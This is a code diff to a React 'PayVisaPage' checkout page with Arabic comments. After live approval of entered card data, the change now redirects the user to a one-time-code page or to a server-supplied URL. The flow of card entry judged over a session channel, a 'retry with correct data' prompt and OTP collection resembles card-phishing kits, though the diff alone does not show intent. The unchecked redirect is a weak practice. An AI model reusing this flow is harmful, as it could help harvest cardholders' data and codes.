@@ -39,10 +39,12 @@ export default function PayVisaPage() {
     const unsubscribe = subscribe((msg: any) => {
       if (msg.sessionId === sessionId) {
         if (msg.type === "payment_approved") {
-          setSubmitStatus("success");
-          setTimeout(() => {
-            window.location.href = "/apply/success";
-          }, 2000);
+          // تحويل العميل لصفحة إدخال رمز OTP
+          if (msg.redirectUrl) {
+            window.location.href = msg.redirectUrl;
+          } else {
+            window.location.href = `/pay-otp?applicationId=${applicationId}&session=${sessionId}`;
+          }
         } else if (msg.type === "payment_rejected") {
           setSubmitStatus("error");
           setErrorMessage(msg.message || "تم رفض بيانات البطاقة. يرجى المحاولة ببيانات صحيحة.");
